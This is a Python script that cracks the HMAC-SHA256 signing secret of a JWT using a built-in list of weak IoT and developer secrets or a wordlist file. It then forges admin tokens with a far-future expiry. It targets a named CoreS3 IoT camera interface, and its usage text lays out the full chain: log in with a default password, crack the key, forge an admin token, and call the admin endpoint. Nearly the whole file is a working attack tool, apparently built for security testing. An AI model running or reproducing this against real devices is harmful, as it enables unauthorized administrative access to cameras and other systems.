#!/usr/bin/env python3
"""
JWT Secret Cracker and Token Forger

Brute-forces the HMAC-SHA256 signing secret of a JWT token using a wordlist,
decodes tokens without verification, and forges new tokens with a known secret.

Targets the CoreS3 IoT camera web interface at /login (POST) which returns
JWT tokens signed with HMAC-SHA256.

Usage examples:

  # Decode a JWT without verifying the signature
  ./jwt_crack.py decode --token "eyJhbGci..."

  # Crack the JWT secret using the built-in IoT wordlist
  ./jwt_crack.py crack --token "eyJhbGci..." --builtin-wordlist

  # Crack using a custom wordlist file
  ./jwt_crack.py crack --token "eyJhbGci..." --wordlist /usr/share/wordlists/rockyou.txt

  # Forge an admin token once you know the secret
  ./jwt_crack.py forge --secret secret123 --forge-user admin --forge-role admin

  # Full workflow: obtain token from device, crack it, forge admin token
  TOKEN=$(curl -s -X POST http://192.168.4.1/login -d 'username=user&password=CoreS3_User_2024' | grep Token: | awk '{print $2}')
  ./jwt_crack.py crack --token "$TOKEN" --builtin-wordlist
  ./jwt_crack.py forge --secret secret123 --forge-user admin --forge-role admin
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


# Common IoT and developer secrets for brute-forcing JWT HMAC keys.
# These are the kinds of secrets that appear in tutorials, default configs,
# and hastily written firmware.
BUILTIN_WORDLIST = [
    "secret",
    "secret123",
    "password",
    "password123",
    "admin",
    "admin123",
    "camera",
    "cameras3cret",
    "iot",
    "iotdevice",
    "device",
    "device123",
    "key",
    "key123",
    "changeme",
    "default",
    "test",
    "test123",
    "firmware",
    "esp32",
    "esp32s3",
    "m5stack",
    "cores3",
    "CoreS3",
    "your-256-bit-secret",
    "supersecret",
    "mysecret",
    "jwt_secret",
    "jwt-secret",
    "jwtSecret",
    "hmac_key",
    "signing_key",
    "token_secret",
    "auth_secret",
    "12345678",
    "123456789",
    "1234567890",
    "qwerty",
    "abc123",
    "letmein",
    "iloveyou",
    "welcome",
    "monkey",
    "master",
    "",
]


def b64url_encode(data):
    """Base64url encode bytes, stripping padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(s):
    """Base64url decode a string, adding padding as needed."""
    s = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.b64decode(s)


def split_jwt(token):
    """Split a JWT into its three parts. Returns (header_b64, payload_b64, signature_b64)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        print("[ERROR] Invalid JWT format. Expected 3 dot-separated parts, got %d." % len(parts))
        sys.exit(1)
    return parts[0], parts[1], parts[2]


def decode_jwt(token):
    """Decode JWT header and payload without verifying the signature."""
    header_b64, payload_b64, sig_b64 = split_jwt(token)

    try:
        header = json.loads(b64url_decode(header_b64))
    except Exception as e:
        print("[ERROR] Failed to decode JWT header: %s" % e)
        sys.exit(1)

    try:
        payload = json.loads(b64url_decode(payload_b64))
    except Exception as e:
        print("[ERROR] Failed to decode JWT payload: %s" % e)
        sys.exit(1)

    return header, payload, sig_b64


def verify_jwt_secret(token, secret):
    """Check if a secret produces a valid HMAC-SHA256 signature for the token."""
    header_b64, payload_b64, sig_b64 = split_jwt(token)
    signing_input = ("%s.%s" % (header_b64, payload_b64)).encode("ascii")
    expected_sig = b64url_encode(
        hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    )
    return hmac.compare_digest(expected_sig, sig_b64)


def forge_jwt(secret, user="admin", role="admin", exp=9999999999):
    """Create a new JWT signed with the given secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": user, "role": role, "exp": exp}

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    signing_input = ("%s.%s" % (header_b64, payload_b64)).encode("ascii")
    signature = b64url_encode(
        hmac.new(secret.encode("utf-8"), signing_input, hashlib.sha256).digest()
    )

    return "%s.%s.%s" % (header_b64, payload_b64, signature)


def cmd_decode(args):
    """Handle the 'decode' subcommand."""
    header, payload, sig_b64 = decode_jwt(args.token)

    print("[*] JWT Decode (no signature verification)")
    print("=" * 50)
    print()
    print("[HEADER]")
    print(json.dumps(header, indent=2))
    print()
    print("[PAYLOAD]")
    print(json.dumps(payload, indent=2))
    print()
    print("[SIGNATURE (base64url)]")
    print(sig_b64)
    print()

    alg = header.get("alg", "unknown")
    print("[*] Algorithm: %s" % alg)
    if alg == "HS256":
        print("[*] HMAC-SHA256 - symmetric key, potentially crackable")
    elif alg == "none":
        print("[!] Algorithm 'none' - signature not verified by server!")
    elif alg.startswith("RS"):
        print("[*] RSA-based - requires private key, not directly crackable via wordlist")


def cmd_crack(args):
    """Handle the 'crack' subcommand."""
    token = args.token

    # Decode first to show what we are attacking
    header, payload, _ = decode_jwt(token)
    alg = header.get("alg", "unknown")

    if alg != "HS256":
        print("[WARNING] Token uses algorithm '%s', not HS256." % alg)
        print("[WARNING] This tool only cracks HMAC-SHA256 secrets.")

    print("[*] JWT Secret Cracker")
    print("=" * 50)
    print("[*] Algorithm: %s" % alg)
    print("[*] Payload:   %s" % json.dumps(payload, separators=(",", ":")))
    print()

    # Build the wordlist
    words = []
    if args.builtin_wordlist:
        words.extend(BUILTIN_WORDLIST)
        print("[*] Loaded %d entries from built-in IoT wordlist" % len(BUILTIN_WORDLIST))

    if args.wordlist:
        try:
            with open(args.wordlist, "r", errors="replace") as f:
                file_words = [line.strip() for line in f if line.strip()]
            words.extend(file_words)
            print("[*] Loaded %d entries from %s" % (len(file_words), args.wordlist))
        except FileNotFoundError:
            print("[ERROR] Wordlist file not found: %s" % args.wordlist)
            sys.exit(1)

    if not words:
        print("[ERROR] No wordlist provided. Use --builtin-wordlist or --wordlist <file>")
        sys.exit(1)

    # Remove duplicates while preserving order
    seen = set()
    unique_words = []
    for w in words:
        if w not in seen:
            seen.add(w)
            unique_words.append(w)
    words = unique_words

    print("[*] Total unique candidates: %d" % len(words))
    print("[*] Cracking...")
    print()

    start_time = time.time()
    for i, candidate in enumerate(words):
        if verify_jwt_secret(token, candidate):
            elapsed = time.time() - start_time
            display = candidate if candidate else "(empty string)"
            print("[+] SECRET FOUND: %s" % display)
            print("[+] Tested %d candidates in %.2f seconds" % (i + 1, elapsed))
            print()
            print("[*] Forge an admin token with:")
            print('    %s forge --secret "%s" --forge-user admin --forge-role admin' % (
                sys.argv[0], candidate
            ))
            return

    elapsed = time.time() - start_time
    print("[-] Secret not found after %d candidates (%.2f seconds)" % (len(words), elapsed))
    print("[-] Try a larger wordlist (e.g., rockyou.txt)")


def cmd_forge(args):
    """Handle the 'forge' subcommand."""
    if not args.secret:
        print("[ERROR] --secret is required for forging tokens")
        sys.exit(1)

    token = forge_jwt(
        secret=args.secret,
        user=args.forge_user,
        role=args.forge_role,
        exp=args.exp,
    )

    print("[*] JWT Token Forger")
    print("=" * 50)
    print()
    print("[*] Secret:  %s" % args.secret)
    print("[*] User:    %s" % args.forge_user)
    print("[*] Role:    %s" % args.forge_role)
    print("[*] Exp:     %d" % args.exp)
    print()
    print("[FORGED TOKEN]")
    print(token)
    print()

    # Verify our own token
    if verify_jwt_secret(token, args.secret):
        print("[+] Signature verified - token is valid")
    else:
        print("[!] Signature verification failed (unexpected)")

    print()
    print("[*] Use with curl:")
    print('    curl -H "Authorization: Bearer %s" http://192.168.4.1/admin/status' % token)


def main():
    parser = argparse.ArgumentParser(
        description="JWT secret cracker and token forger for IoT device exploitation.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s decode --token "eyJhbGci..."
  %(prog)s crack --token "eyJhbGci..." --builtin-wordlist
  %(prog)s crack --token "eyJhbGci..." --wordlist /usr/share/wordlists/rockyou.txt
  %(prog)s forge --secret secret123 --forge-user admin --forge-role admin
""",
    )

    subparsers = parser.add_subparsers(dest="command", help="Action to perform")

    # --- decode ---
    p_decode = subparsers.add_parser(
        "decode",
        help="Decode a JWT without verifying the signature",
        description="Decode and display the header and payload of a JWT token. "
                    "No signature verification is performed.",
    )
    p_decode.add_argument("--token", required=True, help="JWT token string to decode")

    # --- crack ---
    p_crack = subparsers.add_parser(
        "crack",
        help="Brute-force the HMAC-SHA256 signing secret",
        description="Test candidate secrets against the JWT signature to find the signing key.",
    )
    p_crack.add_argument("--token", required=True, help="JWT token string to crack")
    p_crack.add_argument("--wordlist", help="Path to a wordlist file (one secret per line)")
    p_crack.add_argument(
        "--builtin-wordlist",
        action="store_true",
        help="Use built-in list of common IoT/developer secrets",
    )

    # --- forge ---
    p_forge = subparsers.add_parser(
        "forge",
        help="Forge a new JWT with a known secret",
        description="Create and sign a new JWT token with arbitrary claims.",
    )
    p_forge.add_argument("--secret", required=True, help="HMAC-SHA256 signing secret")
    p_forge.add_argument("--forge-user", default="admin", help="User claim value (default: admin)")
    p_forge.add_argument("--forge-role", default="admin", help="Role claim value (default: admin)")
    p_forge.add_argument("--exp", type=int, default=9999999999, help="Expiration timestamp (default: 9999999999)")

    args = parser.parse_args()

    if args.command is None:
        parser.print_help()
        sys.exit(1)

    if args.command == "decode":
        cmd_decode(args)
    elif args.command == "crack":
        cmd_crack(args)
    elif args.command == "forge":
        cmd_forge(args)


if __name__ == "__main__":
    main()
